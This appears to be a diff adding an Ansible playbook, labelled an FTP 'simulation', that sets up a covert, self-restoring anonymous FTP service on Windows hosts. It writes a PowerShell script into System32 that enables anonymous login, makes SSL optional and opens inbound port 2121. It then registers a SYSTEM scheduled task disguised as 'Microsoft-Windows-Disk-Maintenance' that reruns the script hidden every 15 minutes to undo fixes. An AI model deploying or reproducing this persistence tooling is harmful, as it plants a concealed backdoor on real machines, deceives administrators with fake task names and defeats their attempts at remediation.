@@ -1,0 +1,66 @@
+---
+- name: Full Spectrum Persistent FTP Simulation
+  hosts: windows_targets
+  gather_facts: yes
+  vars:
+    ftp_site_name: "Win_Legacy_Svc"
+    ftp_root: "C:\\Windows\\Logs\\FTP_Archive"
+    payload_path: "C:\\Windows\\System32\\Tasks_Config.ps1"
+    task_name: "Microsoft-Windows-Disk-Maintenance" # Obfuscated name
+
+  tasks:
+    - name: 1. Create Hidden Directory Structure
+      ansible.windows.win_file:
+        path: "{{ ftp_root }}"
+        state: directory
+
+    - name: 2. Install FTP Components (OS Check)
+      block:
+        - name: Install for Server Editions (2019/2022)
+          community.windows.win_feature:
+            name: [Web-Server, Web-FTP-Server, Web-FTP-Service]
+            state: present
+          when: ansible_windows_product_type == "Server"
+
+        - name: Install for Desktop Editions (7/10)
+          community.windows.win_optional_feature:
+            name: [IIS-WebServerRole, IIS-FTPServer, IIS-FTPSvc]
+            state: enabled
+          when: ansible_windows_product_type != "Server"
+
+    - name: 3. Deploy Persistence Payload to Disk
+      ansible.windows.win_copy:
+        dest: "{{ payload_path }}"
+        content: |
+          Import-Module WebAdministration
+          # Re-create site if deleted
+          if (!(Get-Website -Name "{{ ftp_site_name }}")) {
+              New-WebFtpSite -Name "{{ ftp_site_name }}" -Port 2121 -PhysicalPath "{{ ftp_root }}"
+          }
+          # Ensure site is running
+          Start-WebItem "IIS:\Sites\{{ ftp_site_name }}"
+          # Enforce Insecure Configs (Anonymous + No SSL)
+          Set-WebConfigurationProperty -Filter "/system.ftpServer/security/authentication/anonymousAuthentication" -Name "enabled" -Value "True" -PSPath "IIS:\" -Location "{{ ftp_site_name }}"
+          Set-WebConfigurationProperty -Filter "/system.ftpServer/security/ssl" -Name "controlChannelPolicy" -Value "SslAllow" -PSPath "IIS:\" -Location "{{ ftp_site_name }}"
+          # Open Firewall
+          if (!(Get-NetFirewallRule -DisplayName "FTP-In" -ErrorAction SilentlyContinue)) {
+              New-NetFirewallRule -DisplayName "FTP-In" -LocalPort 2121 -Action Allow -Direction Inbound -Protocol TCP
+          }
+
+    - name: 4. Execute Payload Immediately
+      ansible.windows.win_shell: "& '{{ payload_path }}'"
+
+    - name: 5. Create Persistent Background Task
+      community.windows.win_scheduled_task:
+        name: "{{ task_name }}"
+        description: "Standard disk maintenance and log archival task."
+        executable: powershell.exe
+        arguments: -ExecutionPolicy Bypass -WindowStyle Hidden -File "{{ payload_path }}"
+        time_trigger:
+          start_boundary: '2024-01-01T00:00:00'
+          repetition:
+            interval: PT15M  # Re-runs every 15 minutes to reset settings
+        state: present
+        enabled: yes
+        username: SYSTEM
+        run_level: highest
